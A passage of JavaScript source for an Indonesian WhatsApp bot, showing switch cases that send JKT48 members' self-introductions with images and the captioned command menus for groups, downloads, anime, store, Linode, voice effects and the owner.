                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-dena': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`DENA NATALIA\`*
> *GENERATION* : 11
> *JIKO* : TOK TOK! SIAPA? SI PENARI YANG AKAN MENARIKMU KE DUNIAKU`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/dena.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-cynthia': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`CYNTHIA YAPUTERA\`*
> *GENERATION* : 11
> *JIKO* : SEMANGATKU TERUS MENERUS MELUAP, POP POP!`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/cynthia.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-chelsea': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`CHELSEA DAVINA\`*
> *GENERATION* : 11
> *JIKO* : AS BRIGHT AS THE SHOOTING STARS IN THE STARRY NIGHT SKY`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/chelsea.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-celline': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`CELLINE THEFANI\`*
> *GENERATION* : 11
> *JIKO* : SEMANIS PERMEN KAPAS DAN SEINDAH BUNGA LAVENDER`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/celline.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-cathleen': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`CATHLEEN NIXIE\`*
> *GENERATION* : 11
> *JIKO* : CRING... SI PERI CANTIK JELITA, ITULAH AKU`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/cathlin.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-alya': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`ALYA AMANDA\`*
> *GENERATION* : 11
> *JIKO* : JIKA HATIMU SEDANG MENANGIS, AKU AKAN DATANG SEBAGAI PELANGI`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/alya.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'jiko-christy': {
   if (banned.includes(m.sender)) {
       return;
   }
   async function sendMessage() {
       let Menu_Rulz = `
> *NAME* : *\`ANGELINA CHRISTY\`*
> *GENERATION* : 7
> *JIKO* : PEDULI DAN BERBAIK HATI SIAPAKAH DIA? CHRISTY`;
       let msg = generateWAMessageFromContent(from, {
           viewOnceMessage: {
               message: {
                   "messageContextInfo": {
                       "deviceListMetadata": {},
                       "deviceListMetadataVersion": 2
                   },
                   interactiveMessage: proto.Message.InteractiveMessage.create({
                       body: proto.Message.InteractiveMessage.Body.create({
                           text: Menu_Rulz
                       }),
                       footer: proto.Message.InteractiveMessage.Footer.create({
                           text: botname
                       }),
                       header: proto.Message.InteractiveMessage.Header.create({
                           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./RulMedia/image/christy.jpg')}, { upload: KhaerulZx.waUploadToServer})), 
                           title: ``,
                           gifPlayback: true,
                           subtitle: ownername,
                           hasMediaAttachment: false  
                       }),
                       nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                           buttons: []
                       }),
                       contextInfo: {
                           mentionedJid: [m.sender], 
                           forwardingScore: 999,
                           isForwarded: true
                       }
                   })
               }
           }
       }, {});
       await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
           messageId: msg.key.id
       });
   }
   sendMessage();
}
break;
case 'groupmenu': {
               if (banned.includes(m.sender)) {
        return;
    }
           if (!isRegistered) return reply('Daftar dulu lah, ketik .daftar')
           let Menu_Rulz = `
┈─────────┈⫺
*メ G R O U P M E N U メ*
┈─────────┈⫺
   ◦ ᴛᴀɢᴀʟʟ
   ◦ ʜɪᴅᴇᴛᴀɢ
   ◦ ᴅᴇᴍᴏᴛᴇ
   ◦ ᴘʀᴏᴍᴏᴛᴇ
   ◦ ᴀᴅᴅ
   ◦ ᴋɪᴄᴋ
   ◦ ɪɴᴠɪᴛᴇ
   ◦ ꜱᴇɴᴅʟɪɴᴋɢᴄ
   ◦ ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ
   ◦ ʟɪɴᴋɢʀᴏᴜᴘ
   ◦ ᴛᴏᴛᴀɢ
   ◦ ᴀɴᴛɪʟɪɴᴋ
   ◦ ᴀɴᴛɪʙᴏᴛ
   ◦ ꜱᴇᴛᴘᴘɢʀᴏᴜᴘ
   ◦ ᴅᴇʟ
   ◦ ꜱᴇᴛɴᴀᴍᴇɢᴄ
   ◦ ᴅᴇʟᴘᴘɢᴄ
   ◦ ᴏᴘᴇɴᴛɪᴍᴇ
   ◦ ᴄʟᴏꜱᴇᴛɪᴍᴇ
   ◦ ᴡᴇʟᴄᴏᴍᴇ
   ◦ ᴄᴇᴋᴍᴇᴍ
   ◦ ᴛɪᴍᴇʀɢᴄ
   ◦ ᴄᴇᴋsɪᴅᴇʀ
   ◦ ᴛᴀɢᴀᴅᴍɪɴ
   ◦ ᴡᴀʀɴ @tag
   ◦ ᴅᴇʟᴡᴀʀɴ @tag
   ◦ ʟɪsᴛᴡᴀʀɴ
   ◦ ᴠɪᴇᴡᴏɴᴄᴇ ᴏɴ/ᴏғ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'panelmenu': case 'cpanelmenu': case 'menupanel': {
    if (banned.includes(m.sender)) {
        return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ P A N E L M E N U メ*
┈─────────┈⫺
   ◦ ʀᴀᴍʟɪꜱᴛ
   ◦ ʙᴀᴄᴋᴜᴘ
   ◦ ᴛᴜᴛᴏʀɪᴀʟ
   ◦ ꜱᴛᴀʀᴛꜱʀᴠ 
   ◦ ᴜɴꜱᴜꜱᴘᴇɴꜱ
   ◦ ᴡᴇʙᴘᴀɴᴇʟ
   ◦ ꜱᴜꜱᴘᴇɴᴅ
   ◦ ꜱᴇɴᴅᴘᴀɴᴇʟ
   ◦ ᴀᴅᴅꜱʀᴠ
   ◦ ʟɪꜱᴛᴀᴅᴍɪɴ
   ◦ ᴀᴅᴍɪɴ
   ◦ ᴀᴅᴅᴜꜱᴇʀ
   ◦ ᴅᴇʟᴜꜱʀ
   ◦ ʟɪꜱᴛᴜꜱʀ
   ◦ ʟɪꜱᴛꜱʀᴠ
   ◦ ᴜᴘᴅᴀᴛᴇꜱʀᴠ
   ◦ ᴅᴇᴛᴜꜱʀ
   ◦ ʀᴇɪɴꜱᴛᴀʟʟ
   ◦ ᴘᴀɴᴇʟ
   ◦ 1ɢʙ
   ◦ 2ɢʙ
   ◦ 3ɢʙ
   ◦ 4ɢʙ
   ◦ 5ɢʙ
   ◦ 6ɢʙ
   ◦ 7ɢʙ
   ◦ 8ɢʙ
   ◦ ᴜɴʟɪ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'anonymousmenu': {
if (banned.includes(m.sender)) {
return;
}
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ A N O N Y M O U S MENU メ*
┈─────────┈⫺
   ◦ ᴍᴇɴғᴇs
   ◦ ʙᴀʟᴀsᴍᴇɴғᴇs
   ◦ lanjut (ᴄᴏᴍɪɴɢ sᴏᴏɴ) 
   ◦ sᴛᴀʀᴛ (ᴄᴏᴍɪɴɢ sᴏᴏɴ) 
   ◦ sᴇɴᴅᴘʀᴏғɪʟᴇ (ᴄᴏᴍɪɴɢ sᴏᴏɴ) 
   ◦ ᴀɴᴏɴʏᴍᴏᴜsᴄʜᴀᴛ (ᴄᴏᴍɪɴɢ sᴏᴏɴ)
   ◦ ɴᴜʟɪsᴋᴀɴᴀɴ
   ◦ ɴᴜʟɪsᴋɪʀɪ
   ◦ ғᴏʟɪᴏᴋɪʀɪ
   ◦ ғᴏʟɪᴏᴋᴀɴᴀɴ`
await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'downloadmenu': {
if (banned.includes(m.sender)) {
return;
}
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ D O W N L O A D M E N U メ*
┈─────────┈⫺
   ◦ ᴘʟᴀʏ
   ◦ ʏᴛᴍᴘ4
   ◦ ʏᴛᴍᴘ3
   ◦ ɪɴꜱᴛᴀɢʀᴀᴍ
   ◦ ᴛɪᴋᴛᴏᴋ
   ◦ ᴛɪᴋᴛᴏᴋ2
   ◦ ᴛɪᴋᴛᴏᴋsʟɪᴅᴇ
   ◦ ᴛɪᴋᴛᴏᴋsʟɪᴅᴇ2
   ◦ ꜱᴘᴏᴛɪꜰʏ
   ◦ ᴛɪᴋᴛᴏᴋᴀᴜᴅɪᴏ
   ◦ ᴍᴇᴅɪᴀꜰɪʀᴇ
   ◦ ʏᴛs
   ◦ ᴛᴛsᴇᴀʀᴄʜ
   ◦ ɢᴏᴏɢʟᴇ
   ◦ ᴛᴡɪᴛᴛᴇʀ
   ◦ ɢᴅʀɪᴠᴇ
   ◦ ɢɪᴛᴄʟᴏɴᴇ
   ◦ ᴘɪɴ
   ◦ ᴄᴀᴘᴄᴜᴛ
   ◦ ᴠɪᴅᴇʏ
   ◦ ᴅᴏᴡɴʟᴏᴀᴅ`
           await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "pushmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
*メ P U S H K O N T A K M E N U メ*
   ◦ ᴘᴜꜱʜᴀᴋᴏɴᴛᴀᴋ2
   ◦ ᴘᴜꜱʜᴋᴏɴᴛᴀᴋ
   ◦ ᴄᴇᴋɪᴅɢᴄ
   ◦ ɢᴇᴛɪᴅɢᴄ`
               await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "primbonmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
*メ P R I M B O N M E N U メ*
   ◦ ᴀʀᴛɪɴᴀᴍᴀ 
   ◦ ᴀʀᴛɪᴍɪᴍᴘɪ 
   ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ 
   ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ 
   ◦ ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ 
   ◦ ʀᴇᴊᴇᴋɪ 
   ◦ ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ 
   ◦ ᴘᴇᴋᴇʀᴊᴀᴀɴ 
   ◦ ᴀʀᴛɪᴛᴀʀᴏᴛ 
   ◦ ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ 
   ◦ ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ 
   ◦ ʜᴀʀɪꜱᴀɴɢᴀʀ 
   ◦ ʜᴀʀɪʙᴀɪᴋ 
   ◦ ꜰᴇɴɢꜱʜᴜɪ 
   ◦ ɴᴀɢᴀʜᴀʀɪ
   ◦ ʜᴀʀɪɴᴀᴀꜱ 
   ◦ ᴡᴇᴛᴏɴ 
   ◦ ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ 
   ◦ ᴊᴏᴅᴏʜ
   ◦ ᴄᴀʀɪᴋᴀᴡᴀɴɢᴄ
   ◦ ᴀʀᴀʜʀᴇᴊᴇᴋɪ 
   ◦ ᴄᴇᴋᴍᴇᴍᴇᴋ
   ◦ ɴᴀᴍᴀɴɪɴᴊᴀ
   ◦ ᴄᴇᴋᴋʜᴏᴅᴀᴍ
   ◦ ꜱɪꜰᴀᴛ 
   ◦ ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ 
   ◦ ᴍᴇᴍᴀɴᴄɪɴɢ 
   ◦ ᴍᴀꜱᴀꜱᴜʙᴜʀ 
   ◦ ᴢᴏᴅɪᴀᴋ 
   ◦ ꜱʜɪᴏ`
               await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "animemenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ A N I M E M E N U メ*
┈─────────┈⫺
◦ ᴋɪʟʟ
◦ ᴘᴀᴛᴛ
◦ ʟɪᴄᴋ
◦ ʏᴇᴇᴛ
◦ ʙᴏɴᴋ
◦ ᴡɪɴᴋ
◦ ᴘᴏɴᴋ
◦ ɴᴏᴍ
◦ sʟᴀᴘ
◦ sᴍɪʟᴇ
◦ ᴡᴀᴠᴇ
◦ sᴍᴜɢ
◦ ᴅᴀɴᴄᴇ
◦ ɢʟᴏᴍᴘ
◦ ʜɪɢʜғɪᴠᴇ
◦ ʜᴀɴᴅʜᴏʟᴅ
◦ ᴀᴋɪʀᴀ
◦ ᴀᴋɪʏᴀᴍᴀ
◦ ᴀɴᴀ
◦ ᴀsᴜɴᴀ
◦ ᴀʏᴜᴢᴀᴡᴀ
◦ ʙᴏʀᴜᴛᴏ
◦ ᴄʜɪʜᴏ
◦ ᴄʜɪᴛᴏɢᴇ
◦ ᴄᴏsᴘʟᴀʏʟᴏ
◦ ᴄᴏsᴘʟᴀʏsᴀɢɪʀɪ
◦ ᴅᴇɪᴅᴀʀᴀ
◦ ᴅᴏʀᴀᴇᴍᴏɴ
◦ ᴇʟᴇɴᴀ
◦ ᴇᴍɪʟɪᴀ
◦ ᴇʀᴢᴀ
◦ ɢʀᴇᴍᴏʀʏ
◦ ʜᴇsᴛɪᴀ
◦ ʜɪɴᴀᴛᴀ
◦ ʜᴜsʙᴜ
◦ ɪɴᴏʀɪ
◦ ɪsᴜᴢᴜ
◦ ɪᴛᴀᴄʜɪ
◦ ɪᴛᴏʀɪ
◦ ᴋᴀɢᴀ1
◦ ᴋᴀɢᴜʀᴀ
◦ ᴋᴀᴋᴀsɪʜ
◦ ᴋᴀᴏʀɪ
◦ ᴋᴇɴᴇᴋɪ
◦ ᴋᴏᴛᴏʀɪ
◦ ᴋᴜʀᴜᴍɪ
◦ ʟᴏʟ
◦ ᴍᴀᴅᴀʀᴀ
◦ ᴍᴇɢᴜᴍɪɴ
◦ ᴍɪᴋᴇʏ
◦ ᴍɪᴋᴜ
◦ ᴍɪɴᴀᴛᴏ
◦ ɴᴀʀᴜᴛᴏ
◦ ɴᴇᴋᴏ
◦ ɴᴇᴋᴏ2
◦ ɴᴇᴋᴏɴɪᴍᴇ
◦ ɴᴇᴢᴜᴋᴏ
◦ ᴏɴᴇᴘɪᴇᴄᴇ
◦ ᴘᴏᴋᴇᴍᴏɴ
◦ ʀᴀɴᴅᴏᴍɴɪᴍᴇ
◦ ʀᴀɴᴅᴏᴍɴɪᴍᴇ2
◦ ʀɪᴢᴇ
◦ sᴀɢɪʀɪ
◦ sᴀᴋᴜʀᴀ
◦ sᴀsᴜᴋᴇ
◦ sʜɪɴᴀ
◦ sʜɪɴᴋᴀ
◦ sʜɪɴᴏᴍɪʏᴀ
◦ sʜɪᴢᴜᴋᴀ
◦ sʜᴏᴛᴀ
◦ ᴛᴇᴊɪɴᴀ
◦ ᴛᴏᴜᴋᴀᴄʜᴀɴ
◦ ᴛsᴜɴᴀᴅᴇ
◦ ᴡᴀɪғᴜ
◦ ᴀɴɪᴍᴇᴡᴀʟʟ
◦ ʏᴏᴛsᴜʙᴀ
◦ ʏᴜᴋɪ
◦ ʏᴜʟɪʙᴏᴄɪʟ
◦ ʏᴜᴍᴇᴋᴏ
◦ 8ʙᴀʟʟ
◦ ᴛɪᴄᴋʟᴇ
◦ ғᴇᴇᴅ
◦ ᴡᴀɪғᴜ
◦ ɴᴇᴋᴏ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "storemenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ S T O R E M E N U メ*
┈─────────┈⫺
   ◦ ᴘᴀʏᴍᴇɴᴛ
   ◦ ʟɪꜱᴛᴘᴀɴᴇʟ
   ◦ ᴠᴘꜱ
   ◦ ᴘᴀɴᴇʟ
   ◦ ʙᴀᴛᴀʟ
   ◦ ᴘʀᴏꜱᴇꜱ
   ◦ ᴅᴏɴᴇ
   ◦ ꜰᴏʀᴍᴀᴛɴᴇᴇᴅ
   ◦ ꜰᴏʀᴍᴀᴛᴊᴘ
   ◦ ᴅᴏɴᴀꜱɪ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "linodemenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ L I N O D E M E N U メ*
┈─────────┈⫺
   ◦ ʀᴇꜱᴇᴛᴘᴀꜱꜱᴡᴏʀᴅ
   ◦ ᴅᴇʟᴇᴛᴇʟɪɴᴏᴅᴇ
   ◦ ʟɪꜱᴛʟɪɴᴏᴅᴇ
   ◦ ᴏɴʟɪɴᴏᴅᴇ
   ◦ ᴏꜰꜰʟɪɴᴏᴅᴇ
   ◦ ʀᴇʙᴏᴏᴛʟɪɴᴏᴅᴇ
   ◦ ʀᴇʙᴜɪʟᴅʟɪɴᴏᴅᴇ
   ◦ ꜱɪꜱᴀʟɪɴᴏᴅᴇ
   ◦ ꜱᴀʟᴅᴏʟɪɴᴏᴅᴇ
   ◦ ᴄᴇᴋᴠᴘꜱʟɪɴᴏᴅᴇ
   ◦ ʟɪɴᴏᴅᴇ2ɢʙ
   ◦ ʟɪɴᴏᴅᴇ4ɢʙ
   ◦ ʟɪɴᴏᴅᴇ8ɢʙ
   ◦ ʟɪɴᴏᴅᴇ16ɢʙ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "subdomenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ S U B D O M E N U メ*
┈─────────┈⫺
   ◦ D1
   ◦ D2
   ◦ D3
   ◦ D4`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "voicemenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ V O I C E M E N U メ*
┈─────────┈⫺
   ◦ ʙᴀss
   ◦ ʙʟᴏᴡɴ
   ◦ ᴅᴇᴇᴘ
   ◦ ᴇᴀʀʀᴀᴘᴇ
   ◦ ғᴀsᴛ
   ◦ ғᴀᴛ
   ◦ ɴɪɢʜᴛᴄᴏʀᴇ
   ◦ ʀᴇᴠᴇʀsᴇ
   ◦ ʀᴏʙᴏᴛ
   ◦ sʟᴏᴡ
   ◦ sᴍᴏᴏᴛʜ
   ◦ sǫᴜɪʀʀᴇʟ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "randomttmenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ R A N D O M T T M E N U メ*
┈─────────┈⫺
   ◦ ᴛɪᴋᴛᴏᴋɢɪʀʟ
   ◦ ᴛɪᴋᴛᴏᴋɴᴜᴋᴛʜʏ
   ◦ ᴛɪᴋᴛᴏᴋᴋᴀʏᴇꜱ
   ◦ ᴛɪᴋᴛᴏᴋᴘᴀɴʀɪᴋᴀ
   ◦ ᴛɪᴋᴛᴏᴋɴᴏᴛɴᴏᴛ
   ◦ ᴛɪᴋᴛᴏᴋɢʜᴇᴀ
   ◦ ᴛɪᴋᴛᴏᴋꜱᴀɴᴛᴜʏ
   ◦ ᴛɪᴋᴛᴏᴋʙᴏᴄɪʟ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case 'ownermenu': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!isRegistered) return reply('Kamu belum daftar, silahkan ketik .daftar');
    let Menu_Rulz = `
┈─────────┈⫺
*メ O W N E R M E N U メ*
┈─────────┈⫺
   ◦ ᴀᴅᴅᴘʀᴇᴍ
   ◦ ᴅᴇʟᴘʀᴇᴍ
   ◦ ʙᴄɢᴄ
   ◦ ɪᴘʙᴏᴛ
   ◦ ʟᴇᴀᴠᴇɢᴄ
   ◦ ꜱᴇᴛʙɪᴏʙᴏᴛ
   ◦ ᴅᴇʟᴇᴛᴇᴘᴘʙᴏᴛ
   ◦ ᴅᴇʟᴄʜᴀᴛ
   ◦ ᴅᴇʟ
   ◦ ɪɴᴠɪᴛᴇ
   ◦ ʙᴄɪᴍɢ
   ◦ ʀᴇꜱᴛᴀʀᴛ
   ◦ ᴅᴇʟᴄᴀꜱᴇ
   ◦ ꜱᴇʟꜰ
   ◦ addlimit
   ◦ resetlimit
   ◦ ᴀᴅᴅᴄᴀꜱᴇ
   ◦ ᴘᴜʙʟɪᴄ
   ◦ ᴀᴜᴛᴏʀᴇᴀᴅ
   ◦ ᴀᴜᴛᴏʙɪᴏ
   ◦ ɢᴇᴛᴄᴀꜱᴇ
   ◦ ʀᴇᴀᴅᴄʜᴀɴɢᴇ
   ◦ ʙɪᴏᴄʜᴀɴɢᴇ
   ◦ ꜱᴇᴛᴘᴘʙᴏᴛ
   ◦ ᴜɴʙʟᴏᴄᴋ
   ◦ ʙʟᴏᴄᴋ
   ◦ ᴄʀᴇᴀᴛᴇɢᴄ
   ◦ ʟɪꜱᴛᴘᴄ
   ◦ ᴊᴏɪɴ
   ◦ addgc
   ◦ delgc
   ◦ clearall
   ◦ ᴀᴅᴅᴏᴡɴᴇʀ
   ◦ ʙʟᴀᴄᴋʟɪꜱᴛ`;
    await KhaerulZx.sendMessage(from, {
        image: { url: './RulMedia/image/KhaerulZx.jpg' },
        caption: Menu_Rulz,
        footer: botname
    }, { quoted: m });
}
break;
case "stickermenu": {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
let Menu_Rulz = `
┈─────────┈⫺
*メ S T I C K E R M E N U メ*
┈─────────┈⫺
   ◦ ᴡᴏᴏғ
   ◦ 8ʙᴀʟʟ
   ◦ ɢᴏᴏsᴇ
   ◦ ɢᴇᴄɢ
   ◦ ғᴇᴇᴅ
   ◦ ᴀᴠᴀᴛᴀʀ
   ◦ ғᴏx_ɢɪʀ
